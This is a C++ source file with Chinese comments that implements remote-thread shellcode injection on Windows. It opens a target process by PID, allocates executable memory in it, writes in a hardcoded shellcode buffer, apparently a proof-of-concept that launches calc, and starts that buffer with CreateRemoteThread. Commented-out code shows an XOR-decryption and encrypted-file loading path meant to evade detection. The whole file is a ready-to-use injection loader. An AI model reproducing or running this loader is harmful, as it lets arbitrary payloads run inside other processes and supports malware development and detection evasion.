#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <cstring>

int main(int argc,char *argv[])
{
	using namespace std;

	DWORD oldPtc;
	DWORD dwProcessId;

	//Usage:CRTinjection.exe <dwProcessId>

	if (argc == 1)
	{
		dwProcessId = GetCurrentProcessId();
	}
	else {
		dwProcessId = atoi(argv[1]);
	}

	/*ifstream binFile("encrypt.bin", ios::binary);
	if (!binFile)
	{
		cout << "无法打开文件" << endl;
		return -1;
	}

	// 获取文件长度
	binFile.seekg(0, binFile.end);
	int length = binFile.tellg();
	binFile.seekg(0, binFile.beg);

	// 动态分配空间，保存文件内容
	char* buf = new char[length];
	binFile.read(buf, length);*/

	//硬编码异或后的shellcode
	unsigned char buf[] = "\x56\x57\x53\x55\x31\xc9\xf7\xe1\x50\x50\x50\x50\x50\xeb\x4b\x5f\xb1\x04\x50\x57\xf2\xae\xaa\x57\x66\xaf\xaa\x57\x54\x57\x41\xe3\x22\x66\x8c\xe9\xe3\x36\x54\x58\xc1\xe8\x18\x74\x2f\xb0\x0b\x99\x5b\x59\x52\x51\x53\x54\x66\x8c\xef\x66\xc1\xef\x08\x75\x02\xcd\x80\xcd\x91\xb0\x06\x6a\xff\x5f\x0f\x05\x3c\x05\x74\x0e\x3c\x08\x74\x0a\x6a\x3b\x58\x99\x5f\x5e\x0f\x05\xeb\x75\x58\x58\x58\x58\x59\x58\x40\x92\x74\x16\x50\x51\x64\x8b\x72\x2f\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\xb2\x50\xeb\x17\xb2\x60\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x48\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xee\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7\x58\x58\x58\x58\x58\x5d\x5b\x5f\x5e\xc3\xe8\x39\xff\xff\xff\x63\x61\x6c\x63";

	//获取shellcode字节大小
	SIZE_T length = sizeof(buf);

	//异或解密shellcode,
	/*for (int i = 0;i < length;i++) {
		buf[i] = buf[i] ^ 89;
	}*/
	
	
	//获取指定进程的handle
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	//在目标进程空间中申请内存
	LPVOID bufAddr = VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	//复制shellcode进已申请的内存
	WriteProcessMemory(hProcess, bufAddr, buf, length,NULL);

	Sleep(1000);
	
	//改变已申请的内存保护属性为PAGE_EXECUTE(可执行)
	VirtualProtectEx(hProcess,bufAddr,length,PAGE_EXECUTE,&oldPtc);

	//创建远程线程执行shellcode
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bufAddr, NULL, 0, NULL);

	//关闭目标进程句柄
	CloseHandle(hProcess);
	return 0;
}
